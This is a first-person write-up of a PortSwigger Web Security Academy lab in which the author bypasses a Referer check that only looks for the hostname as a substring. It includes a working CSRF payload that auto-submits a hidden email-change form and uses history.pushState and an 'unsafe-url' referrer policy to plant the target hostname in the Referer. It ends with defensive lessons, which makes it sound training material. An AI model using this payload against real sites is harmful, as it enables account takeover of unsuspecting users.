# CSRF with Broken Referer Validation

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Vulnerability:** Cross-Site Request Forgery (CSRF)  
**Status:** Solved ✅

## 1. Introduction

Cross-Site Request Forgery (CSRF) is a vulnerability that allows an attacker to trick an authenticated user's browser into sending an unwanted request to a web application.

In this lab, the email change functionality was vulnerable to CSRF because the application attempted to validate the `Referer` header using an insecure validation mechanism.

The objective was to bypass this validation and change the victim's email address by hosting a malicious HTML page on the exploit server.

## 2. Analyzing the Request

After logging into my account, I changed my email address and intercepted the request using Burp Suite.

The request was sent to:

```http
POST /my-account/change-email HTTP/2
```

The request body contained the new email address:

```http
email=wio%40gmacom
```

I noticed that the request included a `Referer` header pointing to the application's account page.

This suggested that the application might be checking the `Referer` header to determine whether the request originated from an acceptable source.

## 3. Testing the Referer Validation

I modified the `Referer` header in Burp Suite by adding a string before the original website's hostname.

For example, the modified URL was structured like this:

```http
Referer: https://selam.com0a9b00e4033f5e7c803f44d6001a00f2.web-security-academy.net/my-account?id=wiener
```

After sending the modified request, the email address was successfully changed.

This demonstrated that the validation could be bypassed.

**My initial conclusion:** The application appeared to check whether its hostname was present somewhere in the `Referer` URL rather than correctly validating the URL's actual origin or hostname.

This was an insecure validation approach because an attacker-controlled string could be placed before the legitimate hostname.

## 4. Creating the CSRF Exploit

After confirming the bypass, I created an HTML page on the PortSwigger exploit server.

The page contained a form that submitted a POST request to the email change endpoint.

I used the following payload:

```html
<form id="form"
      action="https://0a9b00e4033f5e7c803f44d6001a00f2.web-security-academy.net/my-account/change-email"
      method="POST">

    <input type="hidden"
           name="email"
           value="fateh201@gmail.com">
</form>

<meta name="referrer" content="unsafe-url">

<script>
    history.pushState(
        {},
        "",
        "/0a9b00e4033f5e7c803f44d6001a00f2.web-security-academy.net/my-account?id=wiener"
    );

    document.getElementById("form").submit();
</script>
```

### How the payload works

- **HTML form:** Sends a POST request to the target application's email change endpoint.
- **Hidden input:** Supplies the new email address without requiring user interaction.
- **Referrer policy:** The `unsafe-url` policy allows the browser to include the full referring URL, including its path and query string, subject to browser security rules.
- **`history.pushState()`:** Changes the visible URL path of the exploit page without navigating away from it.
- **JavaScript form submission:** Automatically submits the form when the page loads.

The modified path was designed to make the resulting `Referer` URL contain the target application's hostname in the position that bypassed the application's flawed validation.

## 5. Result

I delivered the exploit through the PortSwigger exploit server and clicked **Deliver exploit to victim**.

The lab was successfully solved. ✅

## 6. Key Takeaways

- The `Referer` header can be used as part of CSRF protection, but it must be validated correctly.
- Finding a hostname as a substring within a URL is not a reliable way to verify the URL's origin.
- URL parsing and hostname validation must distinguish the actual hostname from attacker-controlled parts of a URL.
- Browser referrer policies affect the information included in the `Referer` header.
- Burp Suite is useful for testing how server-side validation behaves when request headers are modified.
- An exploit server can demonstrate how a vulnerable endpoint may be triggered through a cross-site request.

**Final lesson:** Security checks must validate the actual origin or hostname using proper URL parsing instead of relying on simple substring matching.
